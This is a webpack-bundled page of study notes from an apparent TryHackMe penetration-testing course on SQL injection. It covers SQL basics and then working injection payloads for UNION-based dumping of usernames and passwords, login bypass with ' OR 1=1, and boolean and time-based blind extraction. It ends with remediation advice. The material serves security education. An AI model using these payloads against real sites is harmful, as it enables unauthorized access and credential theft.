"use strict";(self.webpackChunkTHM_Notes=self.webpackChunkTHM_Notes||[]).push([[6183],{3127:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>d,contentTitle:()=>i,default:()=>h,frontMatter:()=>r,metadata:()=>o,toc:()=>c});var s=t(4848),a=t(8453);const r={},i="Database",o={id:"Jr Penetration Tester/Introduction to Web Hacking/SQL Injection",title:"SQL Injection",description:"SQL (Structured Query Language) Injection, mostly referred to as SQLi, is an attack on a web application database server that causes malicious queries to be executed.",source:"@site/docs/Jr Penetration Tester/Introduction to Web Hacking/SQL Injection.md",sourceDirName:"Jr Penetration Tester/Introduction to Web Hacking",slug:"/Jr Penetration Tester/Introduction to Web Hacking/SQL Injection",permalink:"/docs/Jr Penetration Tester/Introduction to Web Hacking/SQL Injection",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{},sidebar:"THMSidebar",previous:{title:"Intro to SSRF",permalink:"/docs/Jr Penetration Tester/Introduction to Web Hacking/Intro to SSRF"},next:{title:"Subdomain Enumeration",permalink:"/docs/Jr Penetration Tester/Introduction to Web Hacking/Subdomain Enumeration"}},d={},c=[{value:"SELECT",id:"select",level:2},{value:"UNION",id:"union",level:2},{value:"INSERT",id:"insert",level:2},{value:"UPDATE",id:"update",level:2},{value:"DELETE",id:"delete",level:2},{value:"Error-Based SQL Injection",id:"error-based-sql-injection",level:2},{value:"Union-Based SQL Injection",id:"union-based-sql-injection",level:2},{value:"Authentication Bypass",id:"authentication-bypass",level:2},{value:"Boolean Based",id:"boolean-based",level:2},{value:"Time Based",id:"time-based",level:2}];function l(e){const n={br:"br",code:"code",h1:"h1",h2:"h2",img:"img",li:"li",ol:"ol",p:"p",strong:"strong",ul:"ul",...(0,a.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.p,{children:"#Web"}),"\n",(0,s.jsx)(n.p,{children:"SQL (Structured Query Language) Injection, mostly referred to as SQLi, is an attack on a web application database server that causes malicious queries to be executed."}),"\n",(0,s.jsx)(n.h1,{id:"database",children:"Database"}),"\n",(0,s.jsxs)(n.p,{children:["Database:\nA database is a way of electronically storing collections of data in an organised manner. A database is controlled by a DBMS which is an acronym for\xa0 Database Management System, DBMS's fall into two camps ",(0,s.jsx)(n.strong,{children:"Relational"})," or ",(0,s.jsx)(n.strong,{children:"Non-Relational"}),", some common one's are MySQL, Microsoft SQL Server, Access, PostgreSQL and SQLite."]}),"\n",(0,s.jsx)(n.p,{children:"Within a DBMS, you can have multiple databases, each containing its own set of related data. In the database you can store information separately in the database using something called tables, the tables are identified with a unique name for each one. You can see this structure in the diagram below."}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"SQL_Injection_1",src:t(3925).A+"",width:"841",height:"411"})}),"\n",(0,s.jsx)(n.p,{children:"Table:"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"SQL_Injection_2",src:t(841).A+"",width:"1255",height:"268"})}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"Columns:"}),"\nEach column, better referred to as a field has a unique name per table. When creating a column, you also set the type of data it will contain, common ones being integer (numbers), strings (standard text) or dates. Some databases can contain much more complex data, such as geospatial, which contains location information. Setting the data type also ensures that incorrect information isn't stored. If this happens, the database server will usually produce an error message. A column containing an integer can also have an auto-increment feature enabled; this gives each row of data a unique number that grows (increments) with each subsequent row, doing so creates what is called a ",(0,s.jsx)(n.strong,{children:"key"})," field, a key field has to be unique for every row of data which can be used to find that exact row in SQL queries."]}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"Rows:"}),"\nRows or records are what contains the individual lines of data. When you add data to the table, a new row/record is created, and when you delete data, a row/record is removed."]}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"Relational Vs Non-Relational Databases:"}),(0,s.jsx)(n.br,{}),"\n","A relational database, stores information in tables and often the tables have shared information between them, they use columns to specify and define the data being stored and rows to actually store the data. The tables will often contain a column that has a unique ID (primary key) which will then be used in other tables to reference it and cause a relationship between the tables, hence the name ",(0,s.jsx)(n.strong,{children:"relational"})," database."]}),"\n",(0,s.jsx)(n.p,{children:"Non-relational databases sometimes called NoSQL on the other hand is any sort of database that doesn't use tables, columns and rows to store the data, a specific database layout doesn't need to be constructed so each row of data can contain different information which can give more flexibility over a relational database.\xa0 Some popular databases of this type are MongoDB, Cassandra and ElasticSearch."}),"\n",(0,s.jsx)(n.h1,{id:"sql",children:"SQL"}),"\n",(0,s.jsx)(n.p,{children:"SQL (Structured Query Language) is a feature-rich language used for querying databases, these SQL queries are better referred to as statements."}),"\n",(0,s.jsx)(n.h2,{id:"select",children:"SELECT"}),"\n",(0,s.jsx)(n.p,{children:"It is used to retrieve data from the database."}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"select * from users;"}),"\n",(0,s.jsx)(n.code,{children:"select"})," : retrieve some data\n",(0,s.jsx)(n.code,{children:"*"})," : receive back all columns from the table\n",(0,s.jsx)(n.code,{children:"from users"})," : retrieve the data from the table named users\n",(0,s.jsx)(n.code,{children:";"})," : it is the end of the query"]}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"select username,password from users;"}),"\nIt just requesting the username and password field."]}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"select * from users LIMIT 1;"}),"\nBy using the ",(0,s.jsx)(n.code,{children:"LIMIT"})," clause, the first number tells the database how many results you wish to skip, and the second number tells the database how many rows to return."]}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"select * from users where username='admin';"}),"\n",(0,s.jsx)(n.code,{children:"select * from users where username != 'admin';"}),"\n",(0,s.jsx)(n.code,{children:"select * from users where username='admin' or username='jon';"}),"\n",(0,s.jsx)(n.code,{children:"select * from users where username='admin' and password='p4ssword';"}),"\nBy using ",(0,s.jsx)(n.code,{children:"where"})," clause, can return specific clauses."]}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"select * from users where username like 'a%';"}),"\n",(0,s.jsx)(n.code,{children:"select * from users where username like '%n';"}),"\n",(0,s.jsx)(n.code,{children:"select * from users where username like '%mi%';"}),"\nUsing the ",(0,s.jsx)(n.code,{children:"like"})," clause allows you to specify data that isn't an exact match but instead either starts, contains or ends with certain characters by choosing where to place the wildcard character represented by a percentage sign %."]}),"\n",(0,s.jsx)(n.h2,{id:"union",children:"UNION"}),"\n",(0,s.jsx)(n.p,{children:"It combines the results of two or more SELECT statements to retrieve data from either single or multiple tables.\nThe rules to this query are that the UNION statement must retrieve the same number of columns in each SELECT statement, the columns have to be of a similar data type and the column order has to be the same."}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.code,{children:"SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;"})}),"\n",(0,s.jsx)(n.h2,{id:"insert",children:"INSERT"}),"\n",(0,s.jsx)(n.p,{children:"It inserts a new row of data into the table."}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"insert into users (username,password) values ('bob','password123');"}),"\n",(0,s.jsx)(n.code,{children:"into users"}),"\xa0tells the database which table we wish to insert the data into ",(0,s.jsx)(n.code,{children:"(username,password)"})," provides the columns we are providing data for values ",(0,s.jsx)(n.code,{children:"('bob','password');"})," \xa0provides the data for the previously specified columns."]}),"\n",(0,s.jsx)(n.h2,{id:"update",children:"UPDATE"}),"\n",(0,s.jsx)(n.p,{children:"It updates one or more rows of data within a table."}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"update users SET username='root',password='pass123' where username='admin';"}),"\nYou specify the table you wish to update using ",(0,s.jsx)(n.code,{children:"update %tablename% SET"})," and then select the field or fields you wish to update as a comma-separated list such as ",(0,s.jsx)(n.code,{children:"username='root',password='pass123'"})," then finally similar to the SELECT statement, you can specify exactly which rows to update using the where clause such as ",(0,s.jsx)(n.code,{children:"where username='admin;"}),"."]}),"\n",(0,s.jsx)(n.h2,{id:"delete",children:"DELETE"}),"\n",(0,s.jsx)(n.p,{children:"It deletes one or more rows of data."}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"delete from users where username='martin';"}),"\nYou can specify precisely which data to delete using the\xa0",(0,s.jsx)(n.strong,{children:"where"}),"\xa0clause and the number of rows to be deleted using the\xa0",(0,s.jsx)(n.strong,{children:"LIMIT"}),"\xa0clause."]}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"delete from users;"}),"\nAll the data is deleted in the table."]}),"\n",(0,s.jsx)(n.h1,{id:"sql-injection",children:"SQL Injection"}),"\n",(0,s.jsx)(n.p,{children:"It happens when user-provided data gets included in the SQL query."}),"\n",(0,s.jsx)(n.p,{children:"Three types of SQL Injection:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"In-Band SQLi"}),"\n",(0,s.jsx)(n.li,{children:"Blind SQLi"}),"\n",(0,s.jsx)(n.li,{children:"Out-of-Band SQLi"}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:["Example:\nThe common entry of a blog:\n",(0,s.jsx)(n.code,{children:"https://website.thm/blog?id=1"})]}),"\n",(0,s.jsxs)(n.p,{children:["The SQL statement behind it:\n",(0,s.jsx)(n.code,{children:"SELECT * from blog where id=1 and private=0 LIMIT 1;"})]}),"\n",(0,s.jsxs)(n.p,{children:["Try to call it:\n",(0,s.jsx)(n.code,{children:"https://website.thm/blog?id=2;--"})]}),"\n",(0,s.jsxs)(n.p,{children:["Produce the SQL statement:\n",(0,s.jsx)(n.code,{children:"SELECT * from blog where id=2;-- and private=0 LIMIT 1;"})]}),"\n",(0,s.jsxs)(n.p,{children:["It turns to:\n",(0,s.jsx)(n.code,{children:"SELECT * from blog where id=2;--"}),"\nThe semicolon in the URL signifies the end of the SQL statement, and the two dashes cause everything afterwards to be treated as a comment"]}),"\n",(0,s.jsx)(n.h1,{id:"in-band-sqli",children:"In-Band SQLi"}),"\n",(0,s.jsx)(n.p,{children:"In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results. For example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page."}),"\n",(0,s.jsx)(n.h2,{id:"error-based-sql-injection",children:"Error-Based SQL Injection"}),"\n",(0,s.jsx)(n.p,{children:"This type of SQL Injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database."}),"\n",(0,s.jsx)(n.p,{children:"The key to discovering error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced; these are most commonly single apostrophes ( ' ) or a quotation mark ( \" )."}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.code,{children:"https://website.thm/article?id=1"})}),"\n",(0,s.jsxs)(n.p,{children:["First, we try how many column it has, input the id as ",(0,s.jsx)(n.code,{children:"1 UNION SELECT 1,2,3"})]}),"\n",(0,s.jsxs)(n.p,{children:["Then, we need the first query to produce no results, this can simply be done by changing the article id from 1 to 0\n",(0,s.jsx)(n.code,{children:"0 UNION SELECT 1,2,3"})]}),"\n",(0,s.jsxs)(n.p,{children:["Get the name of database\n",(0,s.jsx)(n.code,{children:"0 UNION SELECT 1,2,database()"})]}),"\n",(0,s.jsxs)(n.p,{children:["Gather a list of table in the database\n",(0,s.jsx)(n.code,{children:"0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'"})]}),"\n",(0,s.jsxs)(n.p,{children:["Gather the rows where the table_name column has a value of staff_user\n",(0,s.jsx)(n.code,{children:"0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'"})]}),"\n",(0,s.jsxs)(n.p,{children:["Retrieve the user's information\n",(0,s.jsx)(n.code,{children:"0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users"}),"\nWe use ",(0,s.jsx)(n.code,{children:":"})," to split the username and password and use HTML ",(0,s.jsx)(n.code,{children:"<br>"})," tag that forces each result to be on a separate line."]}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"group_contact()"})," gets the specified column from multiple returned rows and puts it into one string separated by commas.\n",(0,s.jsx)(n.code,{children:"information_schema"})," database contains information about all the databases and tables the user have access to.\n",(0,s.jsx)(n.code,{children:"table_name"})," : the name of table\n",(0,s.jsx)(n.code,{children:"table_schema"})," : the table of database"]}),"\n",(0,s.jsx)(n.h2,{id:"union-based-sql-injection",children:"Union-Based SQL Injection"}),"\n",(0,s.jsx)(n.p,{children:"This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability."}),"\n",(0,s.jsx)(n.h1,{id:"blind-sqli",children:"Blind SQLi"}),"\n",(0,s.jsx)(n.p,{children:"It is when we get little to no feedback to confirm whether our injected queries were, this is because the error messages have been disabled."}),"\n",(0,s.jsx)(n.h2,{id:"authentication-bypass",children:"Authentication Bypass"}),"\n",(0,s.jsx)(n.p,{children:"One of the most straightforward Blind SQL Injection techniques is when bypassing authentication methods such as login forms. The web application is interested in whether the two make a matching pair in the users table."}),"\n",(0,s.jsxs)(n.p,{children:["The SQL Query may like this\n",(0,s.jsx)(n.code,{children:"select * from users where username='%username%' and password='%password%' LIMIT 1;"})]}),"\n",(0,s.jsxs)(n.p,{children:["To make this always be true, we can input\n",(0,s.jsx)(n.code,{children:"' OR 1=1;--"})]}),"\n",(0,s.jsxs)(n.p,{children:["That change into\n",(0,s.jsx)(n.code,{children:"select * from users where username='' and password='' OR 1=1;"})]}),"\n",(0,s.jsx)(n.h2,{id:"boolean-based",children:"Boolean Based"}),"\n",(0,s.jsx)(n.p,{children:"Boolean based SQL Injection refers to the response we receive back from our injection attempts which could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes."}),"\n",(0,s.jsxs)(n.p,{children:["The SQL query just like below\n",(0,s.jsx)(n.code,{children:"select * from users where username = '%username%' LIMIT 1;"})]}),"\n",(0,s.jsxs)(n.p,{children:["We can first use UNION to establish the number of columns\n",(0,s.jsx)(n.code,{children:"admin123' UNION SELECT 1;--"})]}),"\n",(0,s.jsxs)(n.p,{children:["As the web application has responded with the value\xa0",(0,s.jsx)(n.strong,{children:"taken"}),"\xa0as false, we can confirm this is the incorrect value of columns. Keep on adding more columns until we have a\xa0",(0,s.jsx)(n.strong,{children:"taken"}),"\xa0value of\xa0",(0,s.jsx)(n.strong,{children:"true"}),".\n",(0,s.jsx)(n.code,{children:"admin123' UNION SELECT 1,2,3;--"})]}),"\n",(0,s.jsxs)(n.p,{children:["Then we can discovered the database name, we can use the build-in ",(0,s.jsx)(n.code,{children:"database()"}),"method and using the ",(0,s.jsx)(n.code,{children:"like"})," operator to find the results that return a true status.\n",(0,s.jsx)(n.code,{children:"admin123' UNION SELECT 1,2,3 where database() like '%';--"}),"\nWe get a true response because the wildcard ",(0,s.jsx)(n.code,{children:"%"})," will match anything."]}),"\n",(0,s.jsxs)(n.p,{children:["If we change the wildcard operator to\xa0",(0,s.jsx)(n.strong,{children:"a%"}),", you'll see the response goes back to false, which confirms that the database name does not begin with the letter\xa0",(0,s.jsx)(n.strong,{children:"a"}),". We can cycle through all the letters, numbers and characters such as - and _ until we discover a match.\n",(0,s.jsx)(n.code,{children:"admin123' UNION SELECT 1,2,3 where database() like 's%';--"})]}),"\n",(0,s.jsxs)(n.p,{children:["Now you move onto the next character of the database name until you find another\xa0",(0,s.jsx)(n.strong,{children:"true"}),"\xa0response, for example, 'sa%', 'sb%', 'sc%' etc. Keep on with this process until you discover all the characters of the database name."]}),"\n",(0,s.jsxs)(n.p,{children:["Next we can enumerate table name using a similar method by utilising the information_schema database.\n",(0,s.jsx)(n.code,{children:"admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--"}),"\nLike previously, you'll need to cycle through letters, numbers and characters until you find a positive match."]}),"\n",(0,s.jsxs)(n.p,{children:["Finally, you can confirm the table you find by running the following username payload\n",(0,s.jsx)(n.code,{children:"admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--"})]}),"\n",(0,s.jsxs)(n.p,{children:["Lastly, we need to enumerate the column names in the table so we can property search it for login credentials\n",(0,s.jsx)(n.code,{children:"admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';"})]}),"\n",(0,s.jsxs)(n.p,{children:["Again you'll need to cycle through letters, numbers and characters until you find a match. As you're looking for multiple results, you'll have to add this to your payload each time you find a new column name, so you don't keep discovering the same one. For example, once you've found the column named\xa0",(0,s.jsx)(n.strong,{children:"id"}),", you'll append that to your original payload\n",(0,s.jsx)(n.code,{children:"admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';"})]}),"\n",(0,s.jsxs)(n.p,{children:["After that, you can query the ",(0,s.jsx)(n.strong,{children:"users"})," table for login credentials, first, you need to discover a valid username\n",(0,s.jsx)(n.code,{children:"admin123' UNION SELECT 1,2,3 from users where username like 'a%"})]}),"\n",(0,s.jsxs)(n.p,{children:["Once you've cycled through all the characters, you will got the username, and you can concentrate on discover the password\n",(0,s.jsx)(n.code,{children:"admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%"})]}),"\n",(0,s.jsx)(n.p,{children:"Cycling through all the characters, you'll discover the password"}),"\n",(0,s.jsx)(n.h2,{id:"time-based",children:"Time Based"}),"\n",(0,s.jsxs)(n.p,{children:["It is very similar to the boolean based, the same requests are sent, but there is no visual indicator of your queries being wrong or right. It is based on the time the query takes to complete. The time delay is introduced by using built-in methods such as ",(0,s.jsx)(n.code,{children:"SLEEP(x)"})," alongside the UNION statement."]}),"\n",(0,s.jsxs)(n.p,{children:["For example, when trying to establish the number of columns in a table, you would use the following query.\n",(0,s.jsx)(n.code,{children:"admin123' UNION SELECT SLEEP(5);--"})]}),"\n",(0,s.jsxs)(n.p,{children:["If there was no pause in the response time, we know that the query was unsuccessful, so like on previous tasks, we add another column.\n",(0,s.jsx)(n.code,{children:"admin123' UNION SELECT SLEEP(5),2;--"}),"\nIt provides a 5 seconds time delay."]}),"\n",(0,s.jsx)(n.h1,{id:"out-of-band-sqli",children:"Out-of-Band SQLi"}),"\n",(0,s.jsx)(n.p,{children:"It is not as common as it either depends on specific features being enabled on the database server or the web application's business logic, which makes some kind of external network call based on the results from an SQL query."}),"\n",(0,s.jsx)(n.p,{children:"An Out-Of-Band attack is classified by having two different communication channels, one to launch the attack and the other to gather the results."}),"\n",(0,s.jsx)(n.p,{children:"For example, the attack channel could be a web request, and the data gathering channel could be monitoring HTTP/DNS requests made to a service you control."}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsx)(n.li,{children:"An attacker makes a request to a website vulnerable to SQL Injection with an injection payload."}),"\n",(0,s.jsx)(n.li,{children:"The Website makes an SQL query to the database which also passes the hacker's payload."}),"\n",(0,s.jsx)(n.li,{children:"The payload contains a request which forces an HTTP request back to the hacker's machine containing data from the database."}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"Out-of-Band SQLi",src:t(6640).A+"",width:"371",height:"357"})}),"\n",(0,s.jsx)(n.h1,{id:"remediation",children:"Remediation"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Prepared Statements (With Parameterized Queries)\nIn a prepared query, the first thing a developer writes is the SQL query and then any user inputs are added as a parameter afterwards. Writing prepared statements ensures that the SQL code structure doesn't change and the database can distinguish between the query and the data. As a benefit, it also makes your code look a lot cleaner and easier to read."}),"\n",(0,s.jsx)(n.li,{children:"Input Validation\nInput validation can go a long way to protecting what gets put into an SQL query. Employing an allow list can restrict input to only certain strings, or a string replacement method in the programming language can filter the characters you wish to allow or disallow.\xa0"}),"\n",(0,s.jsxs)(n.li,{children:["Escaping User Input\nAllowing user input containing characters such as",(0,s.jsx)(n.code,{children:"' \" $ \\"}),"can cause SQL Queries to break or, even worse, as we've learnt, open them up for injection attacks. Escaping user input is the method of prepending a backslash () to these characters, which then causes them to be parsed just as a regular string and not a special character."]}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(l,{...e})}):l(e)}},3925:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/SQL_Injection_1-c19691b965cd394bc880a120fff3c166.png"},841:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/SQL_Injection_2-2ebe4279421978ef0eedb1c032745cc5.png"},6640:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/SQL_Injection_3-f16a5a692ae73270b377a30b985b0c9f.png"},8453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>o});var s=t(6540);const a={},r=s.createContext(a);function i(e){const n=s.useContext(r);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:i(e.components),s.createElement(r.Provider,{value:n},e.children)}}}]);